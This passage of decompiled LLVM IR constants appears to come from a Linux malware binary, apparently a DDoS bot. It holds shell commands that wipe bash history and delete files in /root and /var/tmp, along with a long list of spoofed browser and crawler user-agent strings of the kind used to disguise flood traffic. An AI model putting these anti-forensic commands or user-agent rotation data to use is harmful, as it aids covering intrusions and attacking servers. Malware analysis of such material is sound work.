x i8]* @global_var_1001339c.309, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_100133a0.310, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_100133a4.311, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_100133a8.312, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_100133ac.313, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_100133b0.314, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_100133b4.315, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_100133b8.316, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_100133cc.317, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100133d8.318, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_100133e4.319, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100133ec.320, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_100133f4.321, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10013400.322, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1001340c.323, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10013414.324, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10013420.325, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1001342c.326, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10013438.327, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10013350.297, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10013358.298, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10013444.328, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1001344c.329, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10013454.330, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10013460.331, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1001346c.332, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10013474.333, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1001347c.334, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10013488.335, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10013490.21, i32 0, i32 0), i8* bitcast (i32* @global_var_10013494.336 to i8*), i8* bitcast (i32* @global_var_10013498.337 to i8*), i8* bitcast (i32* @global_var_1001349c.338 to i8*), i8* bitcast (i32* @global_var_100134a0.339 to i8*), i8* bitcast (i32* @global_var_100134a4.340 to i8*), i8* bitcast (i32* @global_var_100134a8.341 to i8*), i8* bitcast (i32* @global_var_100134ac.342 to i8*), i8* bitcast (i32* @global_var_100134b0.343 to i8*), i8* bitcast (i32* @global_var_100134b4.344 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_100134b8.345, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_100134bc.346, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_100134c0.347, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_100134c4.348, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_100134c8.349, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_100134cc.350, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_100134d0.351, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_100134d4.352, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_100134d8.353, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_100134dc.354, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_100134e0.355, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100134e4.356, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100134ec.357, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100134f4.358, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100134fc.359, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10013504.360, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1001350c.361, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10013514.362, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1001351c.363, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10013524.364, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1001352c.365, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10013538.366, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10013540.367, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10013548.368, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10013554.369, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1001355c.370, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10013564.371, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1001356c.372, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10013574.373, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1001357c.374, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10013584.375, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1001358c.376, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10013598.377, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100135a0.378, i32 0, i32 0)]
@global_var_10014674.384 = constant i32 570425344
@global_var_10014678.385 = constant [16 x i8] c"AAAAAAAAnetcore\00"
@global_var_1001468c.386 = constant [3 x i8] c"AA\00"
@global_var_1001472c.387 = constant [22 x i8] c"history -c;history -w\00"
@global_var_10014744.388 = constant [30 x i8] c"cd /root;rm -rf .bash_history\00"
@global_var_10014764.389 = constant [21 x i8] c"cd /var/tmp; rm -f *\00"
@global_var_100147a4.390 = constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00"
@global_var_100147e4.391 = constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00"
@global_var_10014824.392 = constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00"
@global_var_100148b4.393 = constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00"
@global_var_100148ec.394 = constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00"
@global_var_1001490c.395 = constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00"
@global_var_10014924.396 = constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00"
@global_var_1001497c.397 = constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00"
@global_var_10014a1c.398 = constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00"
@global_var_10014a70.399 = constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00"
@global_var_10014ae4.400 = constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00"
@global_var_10014b24.401 = constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00"
@global_var_10014bdc.402 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00"
@global_var_10014c30.403 = constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00"
@global_var_10014c88.404 = constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00"
@global_var_10014ce0.405 = constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00"
@global_var_10014d20.406 = constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00"
@global_var_10014d68.407 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00"
@global_var_10014dc0.408 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00"
@global_var_10014e2c.409 = constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00"
@global_var_10014e84.410 = constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00"
@global_var_10014ed4.411 = constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00"
@global_var_10014ef8.412 = constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00"
@global_var_10014f54.413 = constant [15 x i8] c"wii libnup/1.0\00"
@global_var_10014f64.414 = constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00"
@global_var_10014f94.415 = constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00"
@global_var_10014fb8.416 = constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00"
@global_var_10014fdc.417 = constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00"
@global_var_10014ff8.418 = constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_10015038.419 = constant [78 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100\00"
@global_var_10015088.420 = constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00"
@global_var_100150d4.421 = constant [60 x i8] c"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\00"
@global_var_10015110.422 = constant [92 x i8] c"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62\00"
@global_var_1001516c.423 = constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00"
@global_var_100151d4.424 = constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00"
@global_var_10015248.425 = constant [119 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19\00"
@global_var_100152c0.426 = constant [89 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)\00"
@global_var_1001531c.427 = constant [81 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)\00"
@global_var_10015370.428 = constant [134 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0\00"
@global_var_100153f8.429 = constant [83 x i8] c"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_1001544c.430 = constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00"
@global_var_100154b4.431 = constant [91 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0\00"
@global_var_10015510.432 = constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00"
@global_var_10015560.433 = constant [67 x i8] c"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0\00"
@global_var_100155a4.434 = constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00"
@global_var_100155f8.435 = constant [75 x i8] c"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000\00"
@global_var_10015644.436 = constant [67 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_10015688.437 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00"
@global_var_100156dc.438 = constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00"
@global_var_10015748.439 = constant [110 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00"
@global_var_100157b8.440 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00"
@global_var_10015814.441 = constant [116 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1\00"
@global_var_10015888.442 = constant [110 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)\00"
@global_var_100158f8.443 = constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00"
@global_var_10015990.444 = constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)\00"
@global_var_100159dc.445 = constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00"
@global_var_10015a44.446 = constant [58 x i8] c"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)\00"
@global_var_10015a80.447 = constant [47 x i8] c"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)\00"
@global_var_10015ab0.448 = constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00"
@global_var_10015af0.449 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\00"
@global_var_10015b3c.450 = constant [83 x i8] c"Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\00"
@global_var_10015b90.451 = constant [173 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)\00"
@global_var_10015c40.452 = constant [102 x i8] c"Mozilla/5.0 (compatible; BecomeBot/3.0; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)\00"
@global_var_10015ca8.453 = constant [102 x i8] c"Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)\00"
@global_var_10015d10.454 = constant [80 x i8] c"Mozilla/5.0 (compatible; BeslistBot; nl; BeslistBot 1.0; http://www.beslist.nl/\00"
@global_var_10015d60.455 = constant [55 x i8] c"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)\00"
@global_var_10015d98.456 = constant [48 x i8] c"zspider/0.9-dev http://feedback.redkolibri.com/\00"
@global_var_10015dc8.457 = constant [91 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 DLC (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_10015e24.458 = constant [105 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_10015e90.459 = constant [102 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_10015ef8.460 = constant [87 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_10015f50.461 = constant [90 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_10015fac.462 = constant [90 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_10016008.463 = constant [86 x i8] c"Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )\00"
@global_var_10016060.464 = constant [93 x i8] c"Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://sp.ask.com/docs/about/tech_crawling.html)\00"
@global_var_100160c0.465 = constant [97 x i8] c"Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)\00"
@global_var_10016124.466 = constant [43 x i8] c"Mozilla/2.0 (compatible; Ask Jeeves/Teoma)\00"
@global_var_10016150.467 = constant [52 x i8] c"TerrawizBot/1.0 (+http://www.terrawiz.com/bot.html)\00"
@global_var_10016184.468 = constant [31 x i8] c"TheSuBot/0.2 (www.thesubot.de)\00"
@global_var_100161a4.469 = constant [31 x i8] c"TheSuBot/0.1 (www.thesubot.de)\00"
@global_var_100161c4.470 = constant [85 x i8] c"FAST-WebCrawler/3.8 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00"
@global_var_1001621c.471 = constant [94 x i8] c"FAST-WebCrawler/3.7/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)\00"
@global_var_1001627c.472 = constant [85 x i8] c"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00"
@global_var_100162d4.473 = constant [94 x i8] c"FAST-WebCrawler/3.6/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)\00"
@global_var_10016334.474 = constant [85 x i8] c"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00"
@global_var_1001638c.475 = constant [31 x i8] c"FAST-WebCrawler/3.x Multimedia\00"
@global_var_100163ac.476 = constant [37 x i8] c"Mozilla/4.0 (compatible: FDSE robot)\00"
@global_var_100163d4.477 = constant [63 x i8] c"findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_10016414.478 = constant [69 x i8] c"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_1001645c.479 = constant [69 x i8] c"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_100164a4.480 = constant [69 x i8] c"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_100164ec.481 = constant [69 x i8] c"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_10016534.482 = constant [81 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable\00"
@global_var_10016588.483 = constant [78 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable\00"
@global_var_100165d8.484 = constant [105 x i8] c"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)\00"
@global_var_10016644.485 = constant [81 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2\00"
@global_var_10016698.486 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2\00"
@global_var_100166f4.487 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2\00"
@global_var_10016750.488 = constant [97 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)\00"
@global_var_100167b4.489 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3\00"
@global_var_10016810.490 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_1001686c.491 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_100168c8.492 = constant [96 x i8] c"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_10016928.493 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)\00"
@global_var_10016970.494 = constant [150 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)\00"
@global_var_10016a08.495 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)\00"
@global_var_10016a54.496 = constant [73 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_10016aa0.497 = constant [78 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)\00"
@global_var_10016af0.498 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)\00"
@global_var_10016b38.499 = constant [84 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)\00"
@global_var_10016b8c.500 = constant [79 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)\00"
@global_var_10016bdc.501 = constant [70 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)\00"
@global_var_10016c24.502 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)\00"
@global_var_10016c70.503 = constant [73 x i8] c"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_10016cbc.504 = constant [71 x i8] c"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)\00"
@global_var_10016d04.505 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_10016d54.506 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_10016da4.507 = constant [51 x i8] c"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_10016dd8.508 = constant [51 x i8] c"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_10016e0c.509 = constant [72 x i8] c"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)\00"
@global_var_10016e54.510 = constant [54 x i8] c"MojeekBot/0.2 (archi; http://www.mojeek.com/bot.html)\00"
@global_var_10016e8c.511 = constant [77 x i8] c"Moreoverbot/5.1 ( http://w.moreover.com; webmaster@moreover.com) Mozilla/5.0\00"
@global_var_10016edc.512 = constant [68 x i8] c"Moreoverbot/5.00 (+http://www.moreover.com; webmaster@moreover.com)\00"
@global_var_10016f20.513 = constant [47 x i8] c"msnbot/1.0 (+http://search.msn.com/msnbot.htm)\00"
@global_var_10016f50.514 = constant [47 x i8] c"msnbot/0.9 (+http://search.msn.com/msnbot.htm)\00"
@global_var_10016f80.515 = constant [48 x i8] c"msnbot/0.11 ( http://search.msn.com/msnbot.htm)\00"
@global_var_10016fb0.516 = constant [46 x i8] c"MSNBOT/0.1 (http://search.msn.com/msnbot.htm)\00"
@global_var_10016fe0.517 = constant [71 x i8] c"Mozilla/5.0 (compatible; mxbot/1.0; +http://www.chainn.com/mxbot.html)\00"
@global_var_10017028.518 = constant [70 x i8] c"Mozilla/5.0 (compatible; mxbot/1.0; http://www.chainn.com/mxbot.html)\00"
@global_var_10017070.519 = constant [55 x i8] c"NetResearchServer/4.0(loopimprovements.com/robot.html)\00"
@global_var_100170a8.520 = constant [55 x i8] c"NetResearchServer/3.5(loopimprovements.com/robot.html)\00"
@global_var_100170e0.521 = constant [55 x i8] c"NetResearchServer/2.8(loopimprovements.com/robot.html)\00"
@global_var_10017118.522 = constant [55 x i8] c"NetResearchServer/2.7(loopimprovements.com/robot.html)\00"
@global_var_10017150.523 = constant [55 x i8] c"NetResearchServer/2.5(loopimprovements.com/robot.html)\00"
@global_var_10017188.524 = constant [83 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)\00"
@global_var_100171dc.525 = constant [55 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)\00"
@global_var_10017214.526 = constant [84 x i8] c"Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)\00"
@global_var_10017268.527 = constant [113 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)\00"
@global_var_100172dc.528 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)\00"
@global_var_10017324.529 = constant [117 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET \00"
@global_var_1001739c.530 = constant [50 x i8] c"Googlebot/2.1 (http://www.googlebot.com/bot.html)\00"
@global_var_100173d0.531 = constant [35 x i8] c"Opera/9.20 (Windows NT 6.0; U; en)\00"
@global_var_100173f4.532 = constant [133 x i8] c"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)\00"
@global_var_1001747c.533 = constant [109 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)\00"
@global_var_100174ec.534 = constant [120 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)\00"
@global_var_10017564.535 = constant [50 x i8] c"Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0\00"
@global_var_10017598.536 = constant [160 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\00"
